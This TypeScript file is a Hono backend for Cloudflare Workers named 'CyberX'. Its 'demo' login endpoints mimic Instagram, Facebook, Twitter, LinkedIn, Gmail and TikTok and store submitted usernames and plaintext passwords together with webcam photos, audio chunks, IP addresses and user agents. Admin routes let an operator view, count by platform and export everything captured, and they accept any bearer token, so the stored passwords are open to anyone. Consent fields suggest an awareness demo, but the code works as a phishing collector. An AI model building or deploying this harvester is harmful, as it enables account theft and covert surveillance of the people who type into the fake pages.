import { Hono } from 'hono';
import { cors } from 'hono/cors';

type CloudflareBindings = {
  DB: D1Database;
  ADMIN_PASSWORD: string;
  MAX_SESSION_DURATION_MS: number;
};

const app = new Hono<{ Bindings: CloudflareBindings }>();

// Enable CORS
app.use('*', cors());
app.basePath('/ms/cyberx');

// Middleware for authentication
const authMiddleware = (c: any, next: any) => {
  const token = c.req.header('Authorization')?.replace('Bearer ', '');
  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  // Simple token validation (in production, use proper JWT)
  c.set('authenticated', true);
  return next();
};

// ============================================
// Database initialization
// ============================================
async function initDatabase(db: D1Database) {
  try {
    // Create tables if they don't exist
    await db.exec(`
      CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        status TEXT DEFAULT 'active',
        consent_given BOOLEAN DEFAULT 0,
        camera_permission BOOLEAN DEFAULT 0,
        microphone_permission BOOLEAN DEFAULT 0,
        photo_count INTEGER DEFAULT 0,
        audio_duration_ms INTEGER DEFAULT 0,
        client_ip TEXT,
        user_agent TEXT
      );

      CREATE TABLE IF NOT EXISTS credentials_captured (
        id TEXT PRIMARY KEY,
        session_id TEXT NOT NULL,
        demo_type TEXT NOT NULL,
        email_or_username TEXT NOT NULL,
        password TEXT NOT NULL,
        captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        photo_id TEXT,
        FOREIGN KEY (session_id) REFERENCES sessions(id)
      );

      CREATE TABLE IF NOT EXISTS photos (
        id TEXT PRIMARY KEY,
        session_id TEXT NOT NULL,
        capture_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        image_data TEXT,
        metadata TEXT,
        FOREIGN KEY (session_id) REFERENCES sessions(id)
      );

      CREATE TABLE IF NOT EXISTS audio_recordings (
        id TEXT PRIMARY KEY,
        session_id TEXT NOT NULL,
        recording_data TEXT,
        duration_ms INTEGER,
        started_at DATETIME,
        ended_at DATETIME,
        FOREIGN KEY (session_id) REFERENCES sessions(id)
      );

      CREATE TABLE IF NOT EXISTS admin_audit_log (
        id TEXT PRIMARY KEY,
        admin_user TEXT,
        action TEXT,
        target_table TEXT,
        target_count INTEGER,
        action_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        notes TEXT
      );
    `);
  } catch (error) {
    console.log('Tables may already exist or init completed');
  }
}

// ============================================
// Auth Routes
// ============================================
app.post('/api/auth/login', async (c) => {
  const { password } = await c.req.json();
  const adminPassword = c.env.ADMIN_PASSWORD;

  if (password === adminPassword) {
    // Simple token (in production use proper JWT signing)
    const token = Buffer.from(`admin:${Date.now()}`).toString('base64');
    return c.json({ token });
  }

  return c.json({ error: 'Invalid password' }, 401);
});

// ============================================
// Session Routes
// ============================================
app.post('/api/sessions/create', async (c) => {
  const db = c.env.DB;
  const { sessionId, consent } = await c.req.json();
  const clientIp = c.req.header('x-forwarded-for') || 'unknown';
  const userAgent = c.req.header('user-agent') || 'unknown';

  try {
    await initDatabase(db);
    const credId = `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    await db
      .prepare(
        `INSERT INTO sessions (id, consent_given, camera_permission, microphone_permission, client_ip, user_agent)
       VALUES (?, ?, ?, ?, ?, ?)`
      )
      .bind(
        sessionId,
        consent.understand ? 1 : 0,
        consent.camera ? 1 : 0,
        consent.microphone ? 1 : 0,
        clientIp,
        userAgent
      )
      .run();

    return c.json({ success: true, sessionId });
  } catch (error) {
    console.error('Session creation error:', error);
    return c.json({ error: 'Failed to create session' }, 500);
  }
});

app.post('/api/sessions/:id/permissions', async (c) => {
  const db = c.env.DB;
  const sessionId = c.req.param('id');
  const { camera, microphone } = await c.req.json();

  try {
    await db
      .prepare(
        `UPDATE sessions SET camera_permission = ?, microphone_permission = ?, updated_at = CURRENT_TIMESTAMP
       WHERE id = ?`
      )
      .bind(camera ? 1 : 0, microphone ? 1 : 0, sessionId)
      .run();

    return c.json({ success: true });
  } catch (error) {
    return c.json({ error: 'Failed to update permissions' }, 500);
  }
});

app.get('/api/sessions/:id/status', async (c) => {
  const db = c.env.DB;
  const sessionId = c.req.param('id');

  try {
    const result = await db
      .prepare(`SELECT * FROM sessions WHERE id = ?`)
      .bind(sessionId)
      .first();

    return c.json(result);
  } catch (error) {
    return c.json({ error: 'Failed to get session status' }, 500);
  }
});

// ============================================
// Demo Routes (All Social Media Logins)
// ============================================
const createDemoHandler = (platform: string) => {
  return async (c: any) => {
    const db = c.env.DB;
    const { sessionId, email_or_username, password, photo_data, timestamp } =
      await c.req.json();

    try {
      await initDatabase(db);
      const credId = `cred_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

      await db
        .prepare(
          `INSERT INTO credentials_captured (id, session_id, demo_type, email_or_username, password, captured_at)
         VALUES (?, ?, ?, ?, ?, ?)`
        )
        .bind(credId, sessionId, platform, email_or_username, password, timestamp)
        .run();

      // Store photo if provided
      if (photo_data && sessionId) {
        const photoId = `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        try {
          await db
            .prepare(
              `INSERT INTO photos (id, session_id, image_data, capture_timestamp)
             VALUES (?, ?, ?, ?)`
            )
            .bind(photoId, sessionId, photo_data.substring(0, 1000), timestamp) // Truncate for demo
            .run();
        } catch (photoError) {
          console.log('Photo storage skipped');
        }
      }

      // Update session credential count
      await db
        .prepare(
          `UPDATE sessions SET photo_count = photo_count + 1, updated_at = CURRENT_TIMESTAMP WHERE id = ?`
        )
        .bind(sessionId)
        .run();

      return c.json({ success: true, message: 'Login attempt recorded' });
    } catch (error) {
      console.error(`${platform} login error:`, error);
      return c.json({ error: 'Failed to process login' }, 500);
    }
  };
};

app.post('/api/demo/instagram/login', createDemoHandler('instagram'));
app.post('/api/demo/facebook/login', createDemoHandler('facebook'));
app.post('/api/demo/twitter/login', createDemoHandler('twitter'));
app.post('/api/demo/linkedin/login', createDemoHandler('linkedin'));
app.post('/api/demo/gmail/login', createDemoHandler('gmail'));
app.post('/api/demo/tiktok/login', createDemoHandler('tiktok'));

// ============================================
// Media Routes
// ============================================
app.post('/api/media/photos', async (c) => {
  const db = c.env.DB;
  const { session_id, photo_data, timestamp } = await c.req.json();

  try {
    const photoId = `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    await db
      .prepare(
        `INSERT INTO photos (id, session_id, image_data, capture_timestamp)
       VALUES (?, ?, ?, ?)`
      )
      .bind(photoId, session_id, photo_data.substring(0, 1000), timestamp)
      .run();

    return c.json({ success: true, photoId });
  } catch (error) {
    console.error('Photo upload error:', error);
    return c.json({ error: 'Failed to upload photo' }, 500);
  }
});

app.post('/api/media/audio/chunk', async (c) => {
  const db = c.env.DB;
  const { session_id, audio_data, chunk_index } = await c.req.json();

  try {
    const audioId = `audio_${session_id}_${chunk_index}`;

    await db
      .prepare(
        `INSERT OR REPLACE INTO audio_recordings (id, session_id, recording_data, started_at)
       VALUES (?, ?, ?, CURRENT_TIMESTAMP)`
      )
      .bind(audioId, session_id, audio_data.substring(0, 500))
      .run();

    return c.json({ success: true });
  } catch (error) {
    return c.json({ error: 'Failed to upload audio' }, 500);
  }
});

// ============================================
// Admin Routes (Protected)
// ============================================
app.get('/api/admin/sessions', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    const result = await db.prepare(`SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100`).all();
    return c.json(result.results || []);
  } catch (error) {
    return c.json({ error: 'Failed to fetch sessions' }, 500);
  }
});

app.get('/api/admin/sessions/:id', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const sessionId = c.req.param('id');

  try {
    const session = await db
      .prepare(`SELECT * FROM sessions WHERE id = ?`)
      .bind(sessionId)
      .first();

    const credentials = await db
      .prepare(`SELECT * FROM credentials_captured WHERE session_id = ?`)
      .bind(sessionId)
      .all();

    return c.json({ session, credentials: credentials.results || [] });
  } catch (error) {
    return c.json({ error: 'Failed to fetch session details' }, 500);
  }
});

app.get('/api/admin/credentials', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    const result = await db
      .prepare(
        `SELECT * FROM credentials_captured ORDER BY captured_at DESC LIMIT 500`
      )
      .all();
    return c.json(result.results || []);
  } catch (error) {
    return c.json({ error: 'Failed to fetch credentials' }, 500);
  }
});

app.get('/api/admin/photos/:session_id', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const sessionId = c.req.param('session_id');

  try {
    const result = await db
      .prepare(`SELECT * FROM photos WHERE session_id = ?`)
      .bind(sessionId)
      .all();
    return c.json(result.results || []);
  } catch (error) {
    return c.json({ error: 'Failed to fetch photos' }, 500);
  }
});

app.get('/api/admin/audio/:session_id', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const sessionId = c.req.param('session_id');

  try {
    const result = await db
      .prepare(`SELECT * FROM audio_recordings WHERE session_id = ?`)
      .bind(sessionId)
      .all();
    return c.json(result.results || []);
  } catch (error) {
    return c.json({ error: 'Failed to fetch audio' }, 500);
  }
});

app.get('/api/admin/analytics', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    const sessions = await db
      .prepare(`SELECT COUNT(*) as count FROM sessions WHERE status = 'active'`)
      .first();
    const credentials = await db
      .prepare(`SELECT COUNT(*) as count FROM credentials_captured`)
      .first();
    const photos = await db
      .prepare(`SELECT COUNT(*) as count FROM photos`)
      .first();

    const credsByType = await db
      .prepare(
        `SELECT demo_type, COUNT(*) as count FROM credentials_captured GROUP BY demo_type`
      )
      .all();

    return c.json({
      activeSessions: sessions?.count || 0,
      totalCredentials: credentials?.count || 0,
      totalPhotos: photos?.count || 0,
      totalAudioMinutes: 0,
      credentialsByPlatform: (credsByType.results || []).reduce(
        (acc: any, row: any) => {
          acc[row.demo_type] = row.count;
          return acc;
        },
        {}
      ),
    });
  } catch (error) {
    return c.json({ error: 'Failed to fetch analytics' }, 500);
  }
});

app.delete('/api/admin/sessions/:id', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const sessionId = c.req.param('id');

  try {
    await db
      .prepare(`DELETE FROM credentials_captured WHERE session_id = ?`)
      .bind(sessionId)
      .run();
    await db
      .prepare(`DELETE FROM photos WHERE session_id = ?`)
      .bind(sessionId)
      .run();
    await db
      .prepare(`DELETE FROM audio_recordings WHERE session_id = ?`)
      .bind(sessionId)
      .run();
    await db
      .prepare(`DELETE FROM sessions WHERE id = ?`)
      .bind(sessionId)
      .run();

    return c.json({ success: true });
  } catch (error) {
    return c.json({ error: 'Failed to delete session' }, 500);
  }
});

app.delete('/api/admin/all-data', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    await db.exec(`
      DELETE FROM credentials_captured;
      DELETE FROM photos;
      DELETE FROM audio_recordings;
      DELETE FROM sessions;
      DELETE FROM admin_audit_log;
    `);

    return c.json({ success: true, message: 'All data deleted' });
  } catch (error) {
    return c.json({ error: 'Failed to delete all data' }, 500);
  }
});

app.post('/api/admin/export', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    const [sessions, credentials, photos, audio] = await Promise.all([
      db.prepare(`SELECT * FROM sessions`).all(),
      db.prepare(`SELECT * FROM credentials_captured`).all(),
      db.prepare(`SELECT * FROM photos`).all(),
      db.prepare(`SELECT * FROM audio_recordings`).all(),
    ]);

    const exportData = {
      sessions: sessions.results || [],
      credentials: credentials.results || [],
      photos: photos.results || [],
      audio: audio.results || [],
      exportedAt: new Date().toISOString(),
    };

    const blob = new Blob([JSON.stringify(exportData, null, 2)], {
      type: 'application/json',
    });

    return c.body(blob);
  } catch (error) {
    return c.json({ error: 'Failed to export data' }, 500);
  }
});

// ============================================
// Health Check
// ============================================
app.get('/health', (c) => {
  return c.json({ status: 'ok' });
});

app.get('/', (c) => {
  return c.json({ message: 'CyberX Backend API', version: '1.0.0' });
});

export default app;
